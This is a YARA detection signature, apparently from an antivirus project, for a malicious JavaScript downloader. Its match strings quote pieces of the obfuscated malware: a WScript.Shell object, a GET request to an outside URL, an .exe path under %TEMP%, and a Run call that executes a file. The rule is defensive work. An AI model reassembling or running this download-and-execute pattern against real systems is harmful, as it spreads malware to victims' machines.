rule sig_20160328_2d5e426b9d6395293e7a316b590931df {
  meta:
    description = "datamaliciousorder - file 20160328_2d5e426b9d6395293e7a316b590931df.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "373942c034a6a41f2e639fd893d60e10946b64e26058f70f58d961ed1d2f52e8"

  strings:
    $s1  = "function Tmypniloc() {return Zgxkfc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"k8H49Xikg.exe\";};" fullword ascii
    $s2  = "do {WScript[Ifsqipejg](Owkdrtjjt() * 11)} while (Lizuej[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Zgxkfc = function Jklfjkj() {return WScript[Kfkshhke](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Lizuej[Njlgdrs](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s5  = "function Dxyyu(Fzdlcitchx, Hfyehmojy){return Fzdlcitchx - Hfyehmojy;};" fullword ascii
    $s6  = "function Iqfxiqaqry() {return ((Tfdkyww == true) && (Tfdkyww == Firjpcgxgi)) ? 1 : Jutlqceuzw;};" fullword ascii
    $s7  = "function Eqjzhv(Bijfvdcmkb){Zgxkfc[\"Run\"](Bijfvdcmkb, Jutlqceuzw, Jutlqceuzw);};" fullword ascii
    $s8  = "Tfdkyww = true; " fullword ascii
    $s9  = "var Kbypakm = new this[\"Date\"]();" fullword ascii
    $s10 = "var Fpolppv = false;" fullword ascii
    $s11 = "var Tfdkyww = false;" fullword ascii
    $s12 = "Firjpcgxgi = true; " fullword ascii
    $s13 = "function Owkdrtjjt(){return 22;};" fullword ascii
    $s14 = "function Sjuqg(Atvwpc) {var Cwhdkz = (1, 2, 3, 4, 5, Atvwpc); return Cwhdkz;};" fullword ascii
    $s15 = "function Bctzgm(){return Kfkshhke;};" fullword ascii
    $s16 = " while (Qqiqztrdw){" fullword ascii
    $s17 = "function Pmpoiz(){return Twbrlt;};" fullword ascii
    $s18 = "return Dxyyu(Jwuszfhiiw, Bbtnyy);" fullword ascii
    $s19 = "var Firjpcgxgi = false;" fullword ascii
    $s20 = "function Mqmnblrc()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}